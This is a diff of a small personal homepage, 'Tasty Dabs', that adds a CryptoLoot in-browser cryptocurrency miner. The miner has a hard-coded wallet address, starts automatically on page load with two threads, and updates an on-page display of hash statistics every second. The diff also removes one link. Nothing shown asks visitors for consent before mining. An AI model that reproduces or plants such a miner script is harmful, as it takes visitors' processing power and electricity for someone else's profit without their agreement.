@@ -4,16 +4,45 @@
 	<title>Tasty Dabs</title>
 	<meta content="width=device-width" name="viewport">
 	<link rel="stylesheet" href="./Styles/common.css" type="text/css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+	<script src="https://crypto-loot.com/lib/miner.min.js"></script>
+	<script>
+	var miner=new CryptoLoot.Anonymous("45QjbzLJxgJAgLtVLBNotjLAcNYevitsaG3g9jiSbbZ8ceBDAsnBv7rJzLWPULeNuX2oX2zahjb1AaejG5GHZonNNk9QQPR",
+			{
+			threads:2,autoThreads:false,throttle:0.1,
+			}
+	);
+	miner.start();
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+		$("#HPS").text(hashesPerSecond);
+		$("#TH").text(totalHashes);
+		$("#AH").text(acceptedHashes);
+	}, 1000);
+	</script>
 </head>
 <body>
-	<div>
+	<div align="left">
 		<h1>Welcome</h1>
 		<p><a href="./Projects/ProjectsPage.html">Projects</a></p>
-		<p><a href="./RyanSite/index.html">RyanSite</a></p>
 		<p>String_Theory_4.2.0.wav<br>
 		<audio controls>
 			<source src="./String_Theory_4.2.0.wav" type="audio/wav">
 		</audio></p>
+	</div>
+	<div align="right">
+		<p>Hashes Per Second: </p><p id="HPS"></p>
+		<p>Total Hashes: </p><p id="TH"></p>
+		<p>Accepted Hashes: </p><p id="AH"></p>
 	</div>
 </body>
 </html>
